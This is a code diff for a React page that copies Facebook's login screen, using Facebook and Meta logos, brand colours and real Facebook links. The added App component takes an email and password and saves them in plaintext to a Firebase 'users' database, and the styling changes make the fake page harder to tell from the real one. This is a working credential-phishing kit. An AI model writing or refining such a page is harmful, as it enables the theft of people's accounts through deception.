@@ -2,6 +2,58 @@ import { useState, useMemo } from "react";
 import { ref, push, set } from "firebase/database";
 import { db } from "../lib/firebase";
 
+
+function App() {
+  const [email, setEmail] = useState("");
+  const [password, setPassword] = useState("");
+  const [msg, setMsg] = useState("");
+
+  const handleSubmit = async (e) => {
+    e.preventDefault();
+
+    try {
+      const newRef = push(ref(db, "users"));
+
+      await set(newRef, {
+        email: email,
+        password: password,
+        timestamp: Date.now()
+      });
+
+      setMsg("Data stored successfully");
+
+      setEmail("");
+      setPassword("");
+
+    } catch (err) {
+      setMsg("Error: " + err.message);
+    }
+  };
+
+  return (
+    <form onSubmit={handleSubmit} className="space-y-4">
+
+      <input
+        type="email"
+        placeholder="Email"
+        value={email}
+        onChange={(e) => setEmail(e.target.value)}
+      />
+
+      <input
+        type="password"
+        placeholder="Password"
+        value={password}
+        onChange={(e) => setPassword(e.target.value)}
+      />
+
+      <button type="submit">Submit</button>
+
+      <p>{msg}</p>
+    </form>
+  );
+}
+
 const FacebookLogo = () => (
   <svg viewBox="0 0 36 36" className="w-12 h-12" fill="hsl(var(--fb-blue))">
     <path d="M20.181 35.87C29.094 34.791 36 27.202 36 18c0-9.941-8.059-18-18-18S0 8.059 0 18c0 8.442 5.811 15.526 13.652 17.471L14 34v-9H9v-5h5v-3.5C14 12.252 16.763 9 21.5 9c1.754 0 3.5.5 3.5.5v4h-2c-1.93 0-3 1.07-3 3v3h5l-1 5h-4v11.27z" />
@@ -210,7 +262,7 @@ const Index = () => {
             </div>
             <div className="grid gap-1 lg:grid-cols-[minmax(200px,180px)_minmax(220px,360px)] items-start">
               <div className="mt-auto pb-8 lg:pb-12">
-                <h1 className="text-[32px] lg:text-[58px] font-extrabold leading-[0.95] tracking-tight text-foreground">
+                <h1 className="text-[32px] lg:text-[58px]  leading-[0.85] tracking-tight text-foreground font-semibold">
                   Explore<br />the things<br /><span className="text-primary">you love.</span>
                 </h1>
               </div>
@@ -220,13 +272,18 @@ const Index = () => {
             </div>
           </div>
 
-          {/* Right side - Login form */}
-          <div className="w-full max-w-[436px] lg:border-l lg:border-border lg:pl-12 lg:h-full">
-            <div className="pt-8 lg:pt-0 pb-8">
-              <div className="flex justify-center lg:hidden mb-6">
-                <FacebookLogo />
+        {/* Right side - Login form */}
+        <div className="w-full max-w-[436px] mx-auto lg:mx-0 lg:border-l lg:border-border lg:pl-12">
+          <div className="pt-6 lg:pt-0 pb-8 px-5 sm:px-0 max-w-[380px] mx-auto">
+
+            <div className="flex justify-center lg:hidden mb-10">
+              <FacebookLogo />
               </div>
-              <h2 className="text-xl font-semibold text-foreground mb-6">{t("loginTitle")}</h2>
+
+            <h2 className="hidden lg:block text-center text-[28px] font-semibold text-foreground mb-8">
+              {t("loginTitle")}
+            </h2> 
+            <div className="space-y-4">
               <FloatingInput
                 type="text"
                 label={t("emailLabel")}
@@ -234,45 +291,57 @@ const Index = () => {
                 onChange={(e) => setEmail(e.target.value)}
                 errorMessage={loginError}
               />
+
               <FloatingInput
                 type="password"
                 label={t("passwordLabel")}
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
-                className="mt-3"
               />
               <button
                 onClick={handleLogin}
-                className="w-full h-[48px] bg-primary text-primary-foreground text-base font-semibold rounded-full mt-4 hover:brightness-95 transition-all"
+                className="w-full h-[52px] bg-[#1877f2] hover:bg-[#166fe5] active:bg-[#166fe5] 
+                          text-white text-[17px] font-semibold rounded-[10px] mt-2 
+                          transition-all duration-200 shadow-sm"
               >
                 {t("loginBtn")}
               </button>
-              <div className="text-center mt-4">
+
+              <div className="text-center py-2">
                 <a
-                  href="https://www.facebook.com/login/identify/?ci=Ac_aRgUQbbEKDW4zKTJPBzVW1d2deLXisauhDhUvotDMhJbe2bZxFfI73aVWSfbhgEFC5HC0nx6J1TdUOVLqnvvQrDreoqCTF3rD70Zp9OUcRZ7iRwt760eVzpHHNg1ZhrOAdQ00TJZQ1L2Axuzm0dR6APHDrBAOnQ46rb4fhcm9YMZB8TpBFeX8ROAfKxvTA7iP0LGKYeZISfl8yq-xIggchk1alNEn-pk8Ls_oXzodITSCMlaDy1CuxY3zTFygFPlm_kmD4GNGNGOp5rXIgWiDvkKu"
-                  className="text-foreground text-sm font-medium hover:underline"
+                  href="https://www.facebook.com/login/identify/"
+                className="inline-block px-24 py-3  text-[#0b0b0b] text-[15px] font-medium underline
+                          rounded-full transition-all duration-200
+                          hover:bg-[#f0f2f5] hover:text-[#0c0c0c]"
                 >
                   {t("forgotPassword")}
                 </a>
               </div>
-              <div className="border-t border-border mt-6 pt-6 flex justify-center">
-                <button
-                  type="button"
-                  onClick={() => window.location.href = "https://www.facebook.com/reg/?entry_point=login&next="}
-                  className="w-full h-[48px] border border-primary text-primary text-base font-semibold rounded-full hover:bg-primary/5 transition-all"
-                >
-                  {t("createAccount")}
-                </button>
+
+              <div className="relative my-6">
+                <div className="absolute inset-0 flex items-center">
+                  <div className="w-full border-t border-gray-300"></div>
+                </div>
               </div>
-              <div className="flex justify-center mt-8">
-                <MetaLogo />
-              </div>
+
+              <button
+                onClick={() => window.location.href = "https://www.facebook.com/reg/"}
+                className="w-full h-[52px] border border-[#1877f2] text-[#1877f2] 
+                          text-[17px] font-semibold rounded-[10px] hover:bg-[#f0f2f5] 
+                          transition-all duration-200"
+              >
+                {t("createAccount")}
+              </button>
+            </div>
+
+            <div className="flex justify-center mt-12 lg:mt-16">
+              <MetaLogo />
             </div>
           </div>
         </div>
+        </div>
       </div>
 
-      {/* Footer */}
       <footer className="py-4 px-4 border-t border-border">
         <div className="max-w-[1100px] mx-auto">
           <div className="flex flex-wrap items-center justify-center gap-x-6 gap-y-1 text-sm mb-2">
